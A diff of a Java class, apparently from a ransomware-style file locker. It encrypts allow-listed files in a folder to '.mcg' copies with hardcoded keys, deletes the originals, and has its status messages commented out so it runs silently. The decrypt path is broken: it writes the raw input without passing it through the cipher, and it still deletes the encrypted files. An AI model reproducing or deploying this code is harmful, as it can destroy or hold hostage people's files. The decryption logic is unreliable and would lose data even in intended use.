@@ -1,9 +1,7 @@
 import javax.crypto.*;
 import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.SecretKeySpec;
-import javax.sound.sampled.*;
 import java.io.*;
-import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
 import java.security.spec.KeySpec;
 
@@ -21,52 +19,37 @@ public class AES256{
         return instance;
     }
 
-    private static final String pw1 = "4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s";
-    private static final String pw2 = "r9s2k4m5n7q8r9t2j3k4n6p7q9s2j3m5n6p8r9s3k4m5p7q8r2j3k4n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m54m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9sp7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5";
-
-    private static String bytesToHex(byte[] hash){
-        StringBuilder hexString = new StringBuilder(2 * hash.length);
-
-        for(int i = 0; i < hash.length; i++){
-            String hex = Integer.toHexString(0xff & hash[i]);
-            if(hex.length() == 1){
-                hexString.append('0');
-            }
-            hexString.append(hex);
-        }
-
-        return hexString.toString();
-
-    }
+    private static final String password_1 = "4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9s";
+    private static final String password_2 = "r9s2k4m5n7q8r9t2j3k4n6p7q9s2j3m5n6p8r9s3k4m5p7q8r2j3k4n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m54m5n6q8r9s3k4m5p7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5n6q8r9s3k4m6p7q8s2j3k5n6p7r9sp7q8r2j3k5n6p7q9s2j4m5n6q8r9s3k4m5p7q8r2j3k5n6p7r9s2j4m5";
 
 
-    private void d_encrypt(int cipherMode, File inputFile, File outputFile){
+    private void crypto(int cryptoMode, File inputFile, File outputFile){
         try{
             MessageDigest digest = MessageDigest.getInstance("SHA-256");
 
-            byte[] encodedpw1 = digest.digest(pw1.getBytes());
-            String hashpw1 = bytesToHex(encodedpw1);
+            byte[] encoded_password_1 = digest.digest(password_1.getBytes());
+            String hash_password_1 = bytesToHex(encoded_password_1);
 
-            byte[] encodedpw2 = digest.digest(pw2.getBytes());
-            String hashpw2 = bytesToHex(encodedpw2);
+            byte[] encoded_password_2 = digest.digest(password_2.getBytes());
+            String hash_password_2 = bytesToHex(encoded_password_2);
 
             FileInputStream fileInputStream = new FileInputStream(inputFile);
             FileOutputStream fileOutputStream = new FileOutputStream(outputFile);
 
             SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
-            KeySpec spec = new PBEKeySpec(hashpw1.toCharArray(), hashpw2.getBytes(), 65536, 256);
+            KeySpec spec = new PBEKeySpec(hash_password_1.toCharArray(), hash_password_2.getBytes(), 65536, 256);
 
-            SecretKey tmp = factory.generateSecret(spec);
-            SecretKeySpec secretKey = new SecretKeySpec(tmp.getEncoded(), "AES");
+            SecretKey sKey = factory.generateSecret(spec);
+            SecretKeySpec secretKey = new SecretKeySpec(sKey.getEncoded(), "AES");
             Cipher cipher = Cipher.getInstance("AES");
 
-            if(cipherMode == Cipher.ENCRYPT_MODE){
+            if(cryptoMode == Cipher.ENCRYPT_MODE){
 
                 cipher.init(Cipher.ENCRYPT_MODE, secretKey);
                 CipherInputStream cipherInputStream = new CipherInputStream(fileInputStream, cipher);
                 write(cipherInputStream, fileOutputStream);
 
-            }else if(cipherMode == Cipher.DECRYPT_MODE){
+            }else if(cryptoMode == Cipher.DECRYPT_MODE){
                 cipher.init(Cipher.DECRYPT_MODE, secretKey);
                 CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, cipher);
                 write(fileInputStream, fileOutputStream);
@@ -77,7 +60,7 @@ public class AES256{
 
 
         }catch (Exception e){
-            System.out.println("Encoding Error: " + e);
+            e.printStackTrace();
         }
     }
 
@@ -98,6 +81,21 @@ public class AES256{
 
     }
 
+    private static String bytesToHex(byte[] hash){
+        StringBuilder hexString = new StringBuilder(2 * hash.length);
+
+        for(int i = 0; i < hash.length; i++){
+            String hex = Integer.toHexString(0xff & hash[i]);
+            if(hex.length() == 1){
+                hexString.append('0');
+            }
+            hexString.append(hex);
+        }
+
+        return hexString.toString();
+
+    }
+
 
     public class Port implements IAES256{
 
@@ -106,25 +104,25 @@ public class AES256{
         @Override
         public void encrypt() {
 
-            WhiteList.resetList();
-            File[] fileArray = f.listFiles();
+            AllowedData.resetList();
+            File[] files = f.listFiles();
 
-            if(fileArray != null){
-                for (File file : fileArray){
-                    if(WhiteList.whiteListEn(file)){
+            if(files != null){
+                for (File file : files){
+                    if(AllowedData.AllowedDataEncode(file)){
                         try{
                             File encrypted = new File(file.toString().concat(".mcg"));
-                            d_encrypt(Cipher.ENCRYPT_MODE, file, encrypted);
-                            System.out.println("Encryption Completed!");
+                            crypto(Cipher.ENCRYPT_MODE, file, encrypted);
+                            //System.out.println("Encryption Completed!");
                         }catch (Exception e){
                             e.printStackTrace();
                         }
 
                         try{
                             if(file.delete()){
-                                System.out.println(file + " has been deleted");
+                                //System.out.println(file + " has been deleted");
                             }else{
-                                System.out.println(file + " failed deleting");
+                                //System.out.println(file + " failed deleting");
                             }
                         }catch (Exception e){
                             e.printStackTrace();
@@ -140,27 +138,27 @@ public class AES256{
         @Override
         public void decrypt() {
 
-            WhiteList.resetList();
-            File[] fileArray = f.listFiles();
+            AllowedData.resetList();
+            File[] files = f.listFiles();
 
-            if(fileArray != null){
-                for(File file : fileArray){
-                    if(WhiteList.whiteListDec(file)){
+            if(files != null){
+                for(File file : files){
+                    if(AllowedData.AllowedDataDecode(file)){
                         if(file.toString().indexOf(".") > 0){
                             String fileWithoutExt = file.toString().substring(0, file.toString().lastIndexOf("."));
                             try{
                                 File decrypted = new File(fileWithoutExt);
-                                d_encrypt(Cipher.DECRYPT_MODE, file, decrypted);
-                                System.out.println("Decryption Completed!");
+                                crypto(Cipher.DECRYPT_MODE, file, decrypted);
+                                //System.out.println("Decryption Completed!");
                             }catch (Exception e){
                                 e.printStackTrace();
                             }
 
                             try{
                                 if(file.delete()){
-                                    System.out.println(file + " has been deleted");
+                                    //System.out.println(file + " has been deleted");
                                 }else{
-                                    System.out.println(file + " failed deleting");
+                                    //System.out.println(file + " failed deleting");
                                 }
                             }catch (Exception e){
                                 e.printStackTrace();
